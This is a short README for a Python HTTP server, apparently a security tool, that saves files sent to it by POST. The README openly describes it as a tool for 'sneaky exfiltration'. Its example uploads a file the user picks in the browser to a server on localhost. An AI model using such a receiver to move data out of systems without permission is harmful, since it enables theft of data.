# exfiltration_http_server

A simple HTTP server that writes data it receives in POST requests to disk. Use it for sneaky exfiltration, maybe.

## Usage

```
usage: exfiltration_http_server.py [-h] [-o DIRECTORY] [-r] [-p PORT] [-b ADDRESS]

optional arguments:
  -h, --help            show this help message and exit
  -o DIRECTORY, --output-directory DIRECTORY
                        The output directory where files are to be written.
  -r, --use-random-filename
                        Use randomly-generated filenames rather than the filename in the URL path.
  -p PORT, --port PORT  The bind port to use.
  -b ADDRESS, --bind ADDRESS
                        The bind address to use.
```

### Example

In a terminal:

```shell
$ ./exfiltration_http_server.py --use-random-filename --port 8000 --bind localhost --output-directory /tmp
```

In a browser (tested in Chromium):

```javascript
fetch('http://localhost:8000', {method: 'POST', body: await (await window.showOpenFilePicker())[0].getFile()})
```

Once a file has been picked, it is uploaded to the HTTP server and its size and save path is printed in the terminal:

```
/tmp/c92a9138fe8234e207542a8d4386358c - 6 bytes
```

:thumbsup:
